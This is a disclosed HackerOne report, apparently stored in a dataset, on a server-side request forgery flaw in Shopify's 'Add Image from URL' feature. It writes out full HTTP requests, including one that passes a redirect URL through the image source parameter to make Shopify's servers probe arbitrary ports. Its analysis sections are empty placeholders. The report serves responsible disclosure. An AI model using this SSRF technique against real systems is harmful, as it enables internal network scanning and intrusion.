---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '67377'
original_report_id: '67377'
title: SSRF via 'Add Image from URL' feature
weakness: Violation of Secure Design Principles
team_handle: shopify
created_at: '2015-06-11T07:49:05.596Z'
disclosed_at: '2015-07-15T01:04:36.189Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- violation-of-secure-design-principles
---

# SSRF via 'Add Image from URL' feature

## Metadata

- HackerOne Report ID: 67377
- Weakness: Violation of Secure Design Principles
- Program: shopify
- Disclosed At: 2015-07-15T01:04:36.189Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Security team,

It is possible to add image from URL for products. To do this the folowing request is used:

```
POST /admin/products/922460995/images HTTP/1.1
Host: test-4925.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-XHR-Referer: https://test-4925.myshopify.com/admin/products/922460995
X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=
Referer: https://test-4925.myshopify.com/admin/products/922460995
Content-Length: 188
Cookie: COOKIES

utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=IMAGE_URL&_method=post
```
This scenario can be abused via SSRF attack and it allows as minimum to scan arbitrary ports from Shopify hosts (e.g. 23.227.55.109).  Despite that URLs are validated it is possible to use a redirect trick to force to connect to any port. For example, to scan ftp port the following request may be send:

```
POST /admin/products/922460995/images HTTP/1.1
Host: test-4925.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-XHR-Referer: https://test-4925.myshopify.com/admin/products/922460995
X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=
Referer: https://test-4925.myshopify.com/admin/products/922460995
Content-Length: 188
Cookie: COOKIES

utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21&_method=post
```
Then using HTTP RTT it is possible to know arbitrary port's status.
The network dump is in attachment.

Cheers,
Denis.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
